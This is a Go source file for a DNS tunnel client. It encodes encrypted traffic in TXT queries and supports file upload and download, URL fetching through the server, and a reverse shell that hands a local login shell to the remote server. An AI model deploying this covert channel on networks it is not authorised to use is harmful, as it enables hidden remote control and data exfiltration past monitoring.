// Package client implements the DNS tunnel client.
package client

import (
	"bytes"
	"crypto/sha1"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"strings"
	"sync"
	"time"

	"github.com/mbreese/harry/pkg/crypto"
	"github.com/mbreese/harry/pkg/encoding"
	"github.com/mbreese/harry/pkg/protocol"

	"github.com/miekg/dns"
)

// Config holds client configuration.
type Config struct {
	Domain       string        // base domain (e.g., "tunnel.example.com")
	Password     string        // shared secret
	Resolver     string        // DNS resolver address (e.g., "8.8.8.8:53")
	PollInterval time.Duration // idle poll interval (default 30s)
}

// Client is the DNS tunnel client.
type Client struct {
	config   *Config
	cipher   *crypto.Cipher
	qc       *protocol.QueryConfig
	clientID byte
	counter  uint32
	tuneSize int // negotiated response size

	mu sync.Mutex
}

// New creates a new tunnel client.
func New(cfg *Config) (*Client, error) {
	c, err := crypto.NewCipher(cfg.Password)
	if err != nil {
		return nil, fmt.Errorf("creating cipher: %w", err)
	}

	if cfg.PollInterval == 0 {
		cfg.PollInterval = 30 * time.Second
	}
	if cfg.Resolver == "" {
		cfg.Resolver = systemResolver()
	}

	return &Client{
		config:   cfg,
		cipher:   c,
		qc:       &protocol.QueryConfig{Domain: cfg.Domain},
		tuneSize: 255,
	}, nil
}

// Connect initiates a connection with the server.
func (c *Client) Connect() error {
	pkt := &protocol.Packet{
		Cmd:     protocol.CmdConnect,
		Counter: c.nextCounter(),
	}

	frame, err := c.sendPacket(pkt, 0)
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}

	if frame.Flags&protocol.FlagError != 0 {
		return fmt.Errorf("server returned error on connect")
	}

	if len(frame.Payload) < 1 {
		return fmt.Errorf("no client ID in connect response")
	}

	c.clientID = frame.Payload[0]
	log.Printf("connected with client ID: %d", c.clientID)

	if err := c.autoTune(); err != nil {
		log.Printf("auto-tune failed, using default size %d: %v", c.tuneSize, err)
	}

	return nil
}

// Poll sends a bare poll (no ACK). Used for pipe/poll modes.
func (c *Client) Poll() (*protocol.Frame, error) {
	pkt := &protocol.Packet{
		Cmd:     protocol.CmdPoll,
		Counter: c.nextCounter(),
	}
	return c.sendPacket(pkt, c.clientID)
}

// pollAck sends a poll with ACK for a transfer chunk, requesting the next chunk.
func (c *Client) pollAck(transferID, lastAck uint16) (*protocol.Frame, error) {
	ackPayload := []byte{
		byte(transferID >> 8), byte(transferID),
		byte(lastAck >> 8), byte(lastAck),
	}
	encrypted, err := c.cipher.Encrypt(ackPayload)
	if err != nil {
		return nil, fmt.Errorf("encrypt ack: %w", err)
	}

	pkt := &protocol.Packet{
		Cmd:     protocol.CmdPoll,
		Counter: c.nextCounter(),
		Payload: encrypted,
	}
	return c.sendPacket(pkt, c.clientID)
}

// recvTransfer receives all chunks of a transfer started by an initial frame.
// The initial frame contains chunk 0. Subsequent chunks are fetched via pollAck.
func (c *Client) recvTransfer(initial *protocol.Frame) ([]byte, error) {
	if initial.Flags&protocol.FlagError != 0 {
		if len(initial.Payload) > 0 {
			return nil, fmt.Errorf("server error: %s", initial.Payload)
		}
		return nil, fmt.Errorf("server error")
	}

	// Single-chunk transfer
	if initial.ChunkTotal <= 1 {
		return initial.Payload, nil
	}

	// Multi-chunk: collect all chunks by index
	chunks := make([][]byte, initial.ChunkTotal)
	chunks[0] = initial.Payload
	showProgress(1, initial.ChunkTotal)

	for idx := uint16(1); idx < initial.ChunkTotal; idx++ {
		frame, err := c.pollAck(initial.TransferID, idx-1)
		if err != nil {
			fmt.Fprintf(os.Stderr, "\n")
			return nil, fmt.Errorf("transfer %d chunk %d/%d: %w",
				initial.TransferID, idx, initial.ChunkTotal, err)
		}
		if frame.Flags&protocol.FlagError != 0 {
			fmt.Fprintf(os.Stderr, "\n")
			return nil, fmt.Errorf("transfer %d chunk %d: server error", initial.TransferID, idx)
		}
		if frame.ChunkIdx != idx {
			fmt.Fprintf(os.Stderr, "\n")
			return nil, fmt.Errorf("transfer %d: expected chunk %d, got %d",
				initial.TransferID, idx, frame.ChunkIdx)
		}
		chunks[idx] = frame.Payload
		showProgress(idx+1, initial.ChunkTotal)
	}
	fmt.Fprintf(os.Stderr, "\n")

	// Reassemble
	var result []byte
	for _, chunk := range chunks {
		result = append(result, chunk...)
	}
	return result, nil
}

// StartRShell sends the reverse shell command to the server and
// runs a local shell, bridging stdin/stdout through the DNS tunnel.
func (c *Client) StartRShell(pollInterval time.Duration) error {
	pkt := &protocol.Packet{
		Cmd:     protocol.CmdRShell,
		Counter: c.nextCounter(),
	}

	frame, err := c.sendPacket(pkt, c.clientID)
	if err != nil {
		return fmt.Errorf("rshell start: %w", err)
	}
	if frame.Flags&protocol.FlagError != 0 {
		if len(frame.Payload) > 0 {
			return fmt.Errorf("rshell: %s", frame.Payload)
		}
		return fmt.Errorf("rshell: server error")
	}

	log.Printf("rshell: server %s", frame.Payload)

	// Spawn local shell
	// Use the user's shell from $SHELL, fall back to /bin/sh
	shellPath := os.Getenv("SHELL")
	if shellPath == "" {
		shellPath = "/bin/sh"
	}
	// -l for login shell (loads RC files and env), -i for interactive
	shell := exec.Command(shellPath, "-l", "-i")
	shellIn, err := shell.StdinPipe()
	if err != nil {
		return fmt.Errorf("shell stdin: %w", err)
	}
	shellOut, err := shell.StdoutPipe()
	if err != nil {
		return fmt.Errorf("shell stdout: %w", err)
	}
	shell.Stderr = shell.Stdout // merge stderr into stdout

	if err := shell.Start(); err != nil {
		return fmt.Errorf("shell start: %w", err)
	}

	log.Printf("rshell: local shell started (pid %d)", shell.Process.Pid)

	// Handle Ctrl-C gracefully
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		log.Printf("rshell: interrupted, killing shell")
		shell.Process.Kill()
	}()
	defer signal.Stop(sigCh)

	// Read shell output in background
	shellCh := make(chan []byte, 16)
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := shellOut.Read(buf)
			if n > 0 {
				data := make([]byte, n)
				copy(data, buf[:n])
				shellCh <- data
			}
			if err != nil {
				close(shellCh)
				return
			}
		}
	}()

	// Main loop: send shell output upstream, write server data to shell stdin
	moreData := false
	for {
		select {
		case data, ok := <-shellCh:
			if !ok {
				// Shell exited
				log.Printf("rshell: shell exited")
				shell.Wait()
				return nil
			}
			// Send shell output to server
			frame, err := c.SendData(data)
			if err != nil {
				log.Printf("rshell: send error: %v", err)
				continue
			}
			// Write any server data to shell stdin
			if len(frame.Payload) > 0 {
				shellIn.Write(frame.Payload)
			}
			moreData = frame.Flags&protocol.FlagMoreData != 0

		default:
			if moreData {
				frame, err := c.Poll()
				if err != nil {
					log.Printf("rshell: poll error: %v", err)
					continue
				}
				if len(frame.Payload) > 0 {
					shellIn.Write(frame.Payload)
				}
				moreData = frame.Flags&protocol.FlagMoreData != 0
			} else {
				// Idle poll
				time.Sleep(pollInterval)
				frame, err := c.Poll()
				if err != nil {
					log.Printf("rshell: poll error: %v", err)
					continue
				}
				if len(frame.Payload) > 0 {
					shellIn.Write(frame.Payload)
				}
				moreData = frame.Flags&protocol.FlagMoreData != 0
			}
		}
	}
}

// SendData sends upstream data and returns the server's frame.
func (c *Client) SendData(data []byte) (*protocol.Frame, error) {
	encrypted, err := c.cipher.Encrypt(data)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	pkt := &protocol.Packet{
		Cmd:     protocol.CmdData,
		Counter: c.nextCounter(),
		Payload: encrypted,
	}
	return c.sendPacket(pkt, c.clientID)
}

// FetchFlags controls fetch behavior.
const (
	FetchNoRedirect byte = 1 << 0
)

// FetchURL requests the server to fetch a URL and returns the response.
func (c *Client) FetchURL(url string, flags byte) ([]byte, error) {
	payload := append([]byte{flags}, []byte(url)...)
	encrypted, err := c.cipher.Encrypt(payload)
	if err != nil {
		return nil, fmt.Errorf("encrypt url: %w", err)
	}

	pkt := &protocol.Packet{
		Cmd:     protocol.CmdFetch,
		Counter: c.nextCounter(),
		Payload: encrypted,
	}

	frame, err := c.sendPacket(pkt, c.clientID)
	if err != nil {
		return nil, err
	}

	return c.recvTransfer(frame)
}

// ListFiles returns the list of files available on the server.
func (c *Client) ListFiles() ([]string, error) {
	pkt := &protocol.Packet{
		Cmd:     protocol.CmdList,
		Counter: c.nextCounter(),
	}

	frame, err := c.sendPacket(pkt, c.clientID)
	if err != nil {
		return nil, err
	}

	result, err := c.recvTransfer(frame)
	if err != nil {
		return nil, err
	}

	if len(result) == 0 {
		return nil, nil
	}

	return strings.Split(string(result), "\n"), nil
}

// RequestFile requests a file from the server and returns its contents.
func (c *Client) RequestFile(name string) ([]byte, error) {
	encrypted, err := c.cipher.Encrypt([]byte(name))
	if err != nil {
		return nil, fmt.Errorf("encrypt filename: %w", err)
	}

	pkt := &protocol.Packet{
		Cmd:     protocol.CmdFile,
		Counter: c.nextCounter(),
		Payload: encrypted,
	}

	frame, err := c.sendPacket(pkt, c.clientID)
	if err != nil {
		return nil, err
	}

	result, err := c.recvTransfer(frame)
	if err != nil {
		return nil, err
	}

	// First 20 bytes are SHA1 hash from server
	if len(result) < sha1.Size {
		return nil, fmt.Errorf("response too short for hash verification")
	}

	serverHash := result[:sha1.Size]
	fileData := result[sha1.Size:]

	localHash := sha1.Sum(fileData)
	if !bytes.Equal(serverHash, localHash[:]) {
		return nil, fmt.Errorf("download hash mismatch: server=%x local=%x", serverHash, localHash)
	}

	log.Printf("download verified: %d bytes, sha1=%x", len(fileData), localHash)
	return fileData, nil
}

// SendFlags controls send behavior.
const (
	SendForce byte = 1 << 0 // Overwrite existing file on server
)

// SendFile sends a local file to the server.
func (c *Client) SendFile(localPath, remoteName string, flags byte) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("reading file: %w", err)
	}
	return c.sendData(data, remoteName, flags, true)
}

// SendStream reads from r and sends to the server as remoteName.
// Size and SHA1 are computed on the fly and sent after all data.
func (c *Client) SendStream(r io.Reader, remoteName string, flags byte) error {
	data, err := io.ReadAll(r)
	if err != nil {
		return fmt.Errorf("reading stdin: %w", err)
	}
	return c.sendData(data, remoteName, flags, false)
}

func (c *Client) sendData(data []byte, remoteName string, flags byte, showPct bool) error {
	// Start upload: payload = [flags 1B][filename...]
	uploadPayload := append([]byte{flags}, []byte(remoteName)...)
	encPayload, err := c.cipher.Encrypt(uploadPayload)
	if err != nil {
		return fmt.Errorf("encrypt upload header: %w", err)
	}

	pkt := &protocol.Packet{
		Cmd:     protocol.CmdUpload,
		Counter: c.nextCounter(),
		Payload: encPayload,
	}

	frame, err := c.sendPacket(pkt, c.clientID)
	if err != nil {
		return fmt.Errorf("send start: %w", err)
	}
	if frame.Flags&protocol.FlagError != 0 {
		if len(frame.Payload) > 0 {
			return fmt.Errorf("server rejected: %s", frame.Payload)
		}
		return fmt.Errorf("server rejected send")
	}

	// Send data in chunks
	maxPayload := c.qc.MaxPayload(c.clientID) - c.cipher.Overhead()
	if maxPayload <= 0 {
		return fmt.Errorf("no space for data")
	}

	hasher := sha1.New()
	sent := 0
	for sent < len(data) {
		end := sent + maxPayload
		if end > len(data) {
			end = len(data)
		}
		chunk := data[sent:end]
		hasher.Write(chunk)

		encrypted, err := c.cipher.Encrypt(chunk)
		if err != nil {
			return fmt.Errorf("encrypt chunk: %w", err)
		}

		pkt := &protocol.Packet{
			Cmd:     protocol.CmdData,
			Counter: c.nextCounter(),
			Payload: encrypted,
		}

		frame, err := c.sendPacket(pkt, c.clientID)
		if err != nil {
			return fmt.Errorf("send chunk: %w", err)
		}
		if frame.Flags&protocol.FlagError != 0 {
			return fmt.Errorf("server error at byte %d", sent)
		}

		sent = end
		if showPct {
			showProgressBytes(sent, len(data), float64(sent)/float64(len(data)))
		} else {
			fmt.Fprintf(os.Stderr, "\r%d bytes sent", sent)
		}
	}
	fmt.Fprintf(os.Stderr, "\n")

	// Signal upload complete with size + SHA1 for verification
	var hashBytes [20]byte
	copy(hashBytes[:], hasher.Sum(nil))
	size := uint32(len(data))

	donePayload := make([]byte, 24)
	donePayload[0] = byte(size >> 24)
	donePayload[1] = byte(size >> 16)
	donePayload[2] = byte(size >> 8)
	donePayload[3] = byte(size)
	copy(donePayload[4:], hashBytes[:])

	encDone, err := c.cipher.Encrypt(donePayload)
	if err != nil {
		return fmt.Errorf("encrypt done: %w", err)
	}

	pkt = &protocol.Packet{
		Cmd:     protocol.CmdUploadDone,
		Counter: c.nextCounter(),
		Payload: encDone,
	}
	frame, err = c.sendPacket(pkt, c.clientID)
	if err != nil {
		return fmt.Errorf("send done: %w", err)
	}
	if frame.Flags&protocol.FlagError != 0 {
		if len(frame.Payload) > 0 {
			return fmt.Errorf("verification failed: %s", frame.Payload)
		}
		return fmt.Errorf("server error on complete")
	}

	log.Printf("send complete: %d bytes, sha1=%x", len(data), hashBytes)
	return nil
}

// autoTune negotiates the maximum TXT response size.
func (c *Client) autoTune() error {
	sizes := []int{255, 512, 1000}

	for _, size := range sizes {
		payload := []byte{byte(size >> 8), byte(size)}
		encrypted, err := c.cipher.Encrypt(payload)
		if err != nil {
			return err
		}

		pkt := &protocol.Packet{
			Cmd:     protocol.CmdTune,
			Counter: c.nextCounter(),
			Payload: encrypted,
		}

		frame, err := c.sendPacket(pkt, c.clientID)
		if err != nil {
			log.Printf("auto-tune: size %d failed: %v", size, err)
			break
		}

		if frame.Flags&protocol.FlagError != 0 {
			break
		}

		c.tuneSize = size
		log.Printf("auto-tune: confirmed size %d", size)
	}

	return nil
}

// sendPacket encodes a packet as a DNS query, sends it, and returns the decoded frame.
func (c *Client) sendPacket(pkt *protocol.Packet, clientID byte) (*protocol.Frame, error) {
	query, err := c.qc.EncodeQuery(pkt, clientID)
	if err != nil {
		return nil, fmt.Errorf("encode query: %w", err)
	}

	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(query), dns.TypeTXT)
	msg.RecursionDesired = true
	msg.SetEdns0(4096, false)

	dnsClient := &dns.Client{Timeout: 10 * time.Second}
	resp, _, err := dnsClient.Exchange(msg, c.config.Resolver)
	if err != nil {
		return nil, fmt.Errorf("dns exchange: %w", err)
	}

	if resp.Rcode != dns.RcodeSuccess {
		return nil, fmt.Errorf("dns error: %s", dns.RcodeToString[resp.Rcode])
	}

	var txt string
	for _, rr := range resp.Answer {
		if t, ok := rr.(*dns.TXT); ok {
			for _, s := range t.Txt {
				txt += s
			}
			break
		}
	}

	if txt == "" {
		return nil, fmt.Errorf("no TXT record in response")
	}

	rawData, err := encoding.Decode(txt)
	if err != nil {
		return nil, fmt.Errorf("base36 decode: %w", err)
	}

	frame, err := protocol.UnmarshalFrame(rawData)
	if err != nil {
		return nil, fmt.Errorf("response frame: %w", err)
	}

	// Decrypt payload if present
	if len(frame.Payload) > 0 {
		decrypted, err := c.cipher.Decrypt(frame.Payload)
		if err != nil {
			return nil, fmt.Errorf("decrypt response: %w", err)
		}
		frame.Payload = decrypted
	}

	return frame, nil
}

// showProgress renders a progress bar to stderr for chunk-based transfers.
func showProgress(current, total uint16) {
	pct := float64(current) / float64(total)
	barWidth := 30
	filled := int(pct * float64(barWidth))
	bar := strings.Repeat("=", filled) + strings.Repeat(" ", barWidth-filled)
	fmt.Fprintf(os.Stderr, "\r[%s] %d/%d chunks (%.0f%%)", bar, current, total, pct*100)
}

// showProgressBytes renders a progress bar for byte-based transfers (uploads).
func showProgressBytes(sent, total int, pct float64) {
	barWidth := 30
	filled := int(pct * float64(barWidth))
	bar := strings.Repeat("=", filled) + strings.Repeat(" ", barWidth-filled)
	fmt.Fprintf(os.Stderr, "\r[%s] %d/%d bytes (%.0f%%)", bar, sent, total, pct*100)
}

// systemResolver reads the first nameserver from /etc/resolv.conf.
func systemResolver() string {
	data, err := os.ReadFile("/etc/resolv.conf")
	if err != nil {
		return "127.0.0.53:53"
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "nameserver") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				ns := fields[1]
				if !strings.Contains(ns, ":") {
					ns = ns + ":53"
				}
				return ns
			}
		}
	}
	return "127.0.0.53:53"
}

func (c *Client) nextCounter() uint32 {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.counter++
	return c.counter & 0xFFFFFF
}
